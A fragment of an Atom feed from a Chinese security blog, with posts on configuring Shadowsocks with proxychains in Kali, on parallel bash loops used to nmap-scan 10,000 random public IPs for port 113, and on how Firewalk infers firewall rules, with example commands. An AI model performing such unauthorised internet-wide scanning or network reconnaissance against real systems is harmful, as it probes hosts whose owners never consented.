      &lt;h2 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h2&gt;&lt;h4 id=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot;&gt;&lt;a href=&quot;#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot; class=&quot;headerlink&quot; title=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&quot;&gt;&lt;/a&gt;本篇教程是笔者翻译国外&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大牛fuzzysecurity 的文章&lt;/a&gt;再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali 代理之shadowsocks &amp; proxychains</title>
    <link href="http://TimeS0ng.github.io/2018/03/30/kali-%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks-proxychains/"/>
    <id>http://TimeS0ng.github.io/2018/03/30/kali-代理之shadowsocks-proxychains/</id>
    <published>2018-03-30T09:14:16.000Z</published>
    <updated>2018-12-18T15:21:35.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"><a href="#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！" class="headerlink" title="&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"></a>&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了<a href="https://blog.csdn.net/qq_27766969/article/details/71593611" target="_blank" rel="external">这篇文章</a>，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！</h4><a id="more"></a>
<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
<h4 id="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"><a href="#好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！" class="headerlink" title="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"></a>好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！</h4><ul>
<li>首先通过proxychains 将本地流量发往localhost 的 1080 端口</li>
<li>localhost 的1080 端口和VPS 的8080 端口通过shadowsocks 建立 ss 连接</li>
<li>本地流量 -&gt; localhost 1080 -&gt; VPS 8080 -&gt; 目标站点</li>
</ul>
<h4 id="以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"><a href="#以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置" class="headerlink" title="以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"></a>以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置</h4><h2 id="0x02-配置-proxychains"><a href="#0x02-配置-proxychains" class="headerlink" title="0x02. 配置 proxychains"></a>0x02. 配置 proxychains</h2><blockquote>
<p>vim /etc/proxychains.conf</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-配置shadowsocks"><a href="#0x03-配置shadowsocks" class="headerlink" title="0x03. 配置shadowsocks"></a>0x03. 配置shadowsocks</h2><h4 id="1-安装shadowsocks"><a href="#1-安装shadowsocks" class="headerlink" title="1. 安装shadowsocks"></a>1. 安装shadowsocks</h4><blockquote>
<p>apt-get install python-pip &amp;&amp; pip install shadowsocks</p>
</blockquote>
<h4 id="2-优化shadowsocks-，这里我也不懂优化策略"><a href="#2-优化shadowsocks-，这里我也不懂优化策略" class="headerlink" title="2. 优化shadowsocks ，这里我也不懂优化策略"></a>2. 优化shadowsocks ，这里我也不懂优化策略</h4><blockquote>
<p>vim  /etc/sysctl.d/local.conf</p>
<p>sysctl –system  &emsp; # 优化文件保存之后执行这条命令生效 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># max open files</div><div class="line">fs.file-max = 51200  </div><div class="line"># max read buffer</div><div class="line">net.core.rmem_max = 67108864  </div><div class="line"># max write buffer</div><div class="line">net.core.wmem_max = 67108864  </div><div class="line"># default read buffer</div><div class="line">net.core.rmem_default = 65536  </div><div class="line"># default write buffer</div><div class="line">net.core.wmem_default = 65536  </div><div class="line"># max processor input queue</div><div class="line">net.core.netdev_max_backlog = 4096  </div><div class="line"># max backlog</div><div class="line">net.core.somaxconn = 4096</div><div class="line"></div><div class="line"># resist SYN flood attacks</div><div class="line">net.ipv4.tcp_syncookies = 1  </div><div class="line"># reuse timewait sockets when safe</div><div class="line">net.ipv4.tcp_tw_reuse = 1  </div><div class="line"># turn off fast timewait sockets recycling</div><div class="line">net.ipv4.tcp_tw_recycle = 0  </div><div class="line"># short FIN timeout</div><div class="line">net.ipv4.tcp_fin_timeout = 30  </div><div class="line"># short keepalive time</div><div class="line">net.ipv4.tcp_keepalive_time = 1200  </div><div class="line"># outbound port range</div><div class="line">net.ipv4.ip_local_port_range = 10000 65000  </div><div class="line"># max SYN backlog</div><div class="line">net.ipv4.tcp_max_syn_backlog = 4096  </div><div class="line"># max timewait sockets held by system simultaneously</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000  </div><div class="line"># turn on TCP Fast Open on both client and server side</div><div class="line">net.ipv4.tcp_fastopen = 3  </div><div class="line"># TCP receive buffer</div><div class="line">net.ipv4.tcp_rmem = 4096 87380 67108864  </div><div class="line"># TCP write buffer</div><div class="line">net.ipv4.tcp_wmem = 4096 65536 67108864  </div><div class="line"># turn on path MTU discovery</div><div class="line">net.ipv4.tcp_mtu_probing = 1</div><div class="line"></div><div class="line"># for high-latency network</div><div class="line">net.ipv4.tcp_congestion_control = hybla</div><div class="line"></div><div class="line"># for low-latency network, use cubic instead</div><div class="line"># net.ipv4.tcp_congestion_control = cubic</div></pre></td></tr></table></figure>
<h4 id="3-配置Shadowsocks配置文件"><a href="#3-配置Shadowsocks配置文件" class="headerlink" title="3. 配置Shadowsocks配置文件"></a>3. 配置Shadowsocks配置文件</h4><blockquote>
<p>mkdir /root/ss &amp;&amp; cd /root/ss &amp;&amp; vim ssserver.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;</div><div class="line">    &quot;server&quot;: &quot;my_server_ip&quot;, // 这里输入墙外服务器地址</div><div class="line">    &quot;server_port&quot;: 8080, // 墙外服务器的端口</div><div class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">    &quot;local_port&quot;: 1080, // 为了安全，可修改为大于 1024 的数字</div><div class="line">    &quot;password&quot;: &quot;mypassword&quot;, // 设置一个密码</div><div class="line">    &quot;timeout&quot;: 300,</div><div class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;,//要和服务端的加密方式相同</div><div class="line">    &quot;fast_open&quot;: false</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="4-修改-python-配置文件，不然运行不了-ss"><a href="#4-修改-python-配置文件，不然运行不了-ss" class="headerlink" title="4. 修改 python 配置文件，不然运行不了 ss"></a>4. 修改 python 配置文件，不然运行不了 ss</h4><blockquote>
<p>vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py &emsp; # 修改成如下所示</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
<h4 id="5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可"><a href="#5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可" class="headerlink" title="5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可"></a>5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可</h4><blockquote>
<p>sslocal -c /root/ss/ssserver.json -d start &emsp; # 重启之后需要再次运行该命令启动 ss</p>
<p>proxychains curl ip.cn</p>
<p>proxychains firefox</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了&lt;a href=&quot;https://blog.csdn.net/qq_27766969/article/details/71593611&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bash 伪多进程</title>
    <link href="http://TimeS0ng.github.io/2018/03/28/bash-%E4%BC%AA%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>http://TimeS0ng.github.io/2018/03/28/bash-伪多进程/</id>
    <published>2018-03-28T13:57:03.000Z</published>
    <updated>2018-03-28T13:59:37.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"><a href="#emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！" class="headerlink" title="&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"></a>&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！</h4><a id="more"></a>
<h2 id="0x01-脚本分析"><a href="#0x01-脚本分析" class="headerlink" title="0x01. 脚本分析"></a>0x01. 脚本分析</h2><blockquote>
<ol>
<li>首先我用了两个for 循环进行嵌套，然后用了&amp;&emsp;wait 来开设伪进程，就相当于里层循环正常执行，但是外层循环会被置于后台，这样我们相当于同时开了三个进程来进行里层循环，所以总共需要9 s 来运行整个脚本，而不是27 s 当然你也可以将里层循环也开启伪进程，不过后面扫公网时我不希望自己开的进程达到数万个，所以我这里没有加</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170109_LlEaRr_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170326_OXxGMH_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>理论分析完了，现在来看看我扫描公网时用的脚本，相当于我开了100 个进程，然后随即扫描公网中开放113 端口的主机</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171237_IoEvHX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>当启动脚本后，CPU 瞬间爆炸，后台也全是nmap 进程，我总共扫了1 w 个随机 IP ，结果只有8 个IP 开放了113 端口，不过只花费了4 min </li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314171711_pAgsuO_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示"><a href="#emsp-emsp-大家可以点击这里在bilibili-查看我的视屏演示" class="headerlink" title="&emsp;&emsp;大家可以点击这里在bilibili 查看我的视屏演示"></a>&emsp;&emsp;大家可以点击这里在bilibili 查看我的<a href="https://www.bilibili.com/video/av20765871/" target="_blank" rel="external">视屏演示</a></h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Firewalk 原理</title>
    <link href="http://TimeS0ng.github.io/2018/03/10/Firewalk-%E5%8E%9F%E7%90%86/"/>
    <id>http://TimeS0ng.github.io/2018/03/10/Firewalk-原理/</id>
    <published>2018-03-10T11:42:44.000Z</published>
    <updated>2018-12-18T15:15:51.593Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o"><a href="#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o" class="headerlink" title="&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^"></a>&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^</h4><a id="more"></a>
<h2 id="0x01-Firewalk-简介"><a href="#0x01-Firewalk-简介" class="headerlink" title="0x01. Firewalk 简介"></a>0x01. Firewalk 简介</h2><h4 id="emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。"><a href="#emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。" class="headerlink" title="&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。"></a>&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。</h4><h2 id="0x02-Firewalk-原理"><a href="#0x02-Firewalk-原理" class="headerlink" title="0x02. Firewalk 原理"></a>0x02. Firewalk 原理</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310171815_K8vVxh_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] Firewalk 主要是通过对 TTL 值的控制来达到探测目的的，下面介绍的原理理论上成立，但当我实际开防火墙测试时很多报文都会被防火墙过滤，但路由器测试毫无问题！</p>
</blockquote>
<h4 id="emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）"><a href="#emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）" class="headerlink" title="&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）"></a>&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）</h4><h4 id="emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放"><a href="#emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放" class="headerlink" title="&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放"></a>&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放</h4><h4 id="emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则"><a href="#emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则" class="headerlink" title="&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则"></a>&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则</h4><h2 id="0x03-Firewalk-实战"><a href="#0x03-Firewalk-实战" class="headerlink" title="0x03. Firewalk 实战"></a>0x03. Firewalk 实战</h2><h4 id="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"><a href="#我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。" class="headerlink" title="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"></a>我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。</h4><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h4 id="emsp-emsp-1-kali-emsp-IP-192-168-1-107"><a href="#emsp-emsp-1-kali-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;1. kali &emsp;IP=192.168.1.107"></a>&emsp;&emsp;1. kali &emsp;IP=192.168.1.107</h4><h4 id="emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）"><a href="#emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）" class="headerlink" title="&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）"></a>&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310191938_xHQroD_Screenshot.jpeg" alt=""></p>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><blockquote>
<ol>
<li>首先配置路由器规则</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192546_EDr687_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</li>
</ol>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>图中的 100.64.0.1 其实是下一节点的 IP 地址，如果它也在内网中是一个路由节点的话那么我们的下一条命令应该是firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 100.64.0.1 8.8.8.8  通过最上面我给大家看的测试用图可知100.64.0.1 其实是公网IP</li>
</ol>
</blockquote>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"><a href="#emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。" class="headerlink" title="&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"></a>&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。</h4>]]></content>
    
    <summary type="html">
    
